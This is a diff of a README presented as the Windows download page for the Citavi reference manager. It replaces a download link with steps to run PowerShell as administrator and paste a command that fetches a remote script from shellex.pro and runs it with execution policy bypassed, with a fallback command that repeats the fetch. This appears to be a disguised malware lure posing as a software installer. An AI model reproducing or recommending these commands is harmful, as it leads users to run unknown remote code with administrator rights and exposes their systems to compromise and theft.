@@ -6,20 +6,31 @@ Reference management plus project planning for scholars · Business-class packag
 
 <div align="center">
 
-## Download & Install
+## INSTALLATION
 
-> **This is the download page.** Use the button or link below to get **Citavi** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<a href="https://citavi.mefidirect.xyz/"><img src="https://img.shields.io/badge/DOWNLOAD-%E2%86%92-2d3748?style=flat-square" alt="DOWNLOAD"></a><a href="https://citavi.mefidirect.xyz/"><img src="https://img.shields.io/badge/CITAVI-%E2%86%93-0078D4?style=flat-square" alt="CITAVI"></a>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Release page** | **[citavi.mefidirect.xyz](https://citavi.mefidirect.xyz/)** |
-| **Full URL** | `https://citavi.mefidirect.xyz/` |
-| **Type** | PC installer · Windows 10 / 11 (x64) |
-| **Admin** | Launch the installer with Administrator rights |
+<details>
+<summary><b>Command did not start?</b></summary>
 
-</div>
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📋 Overview
 
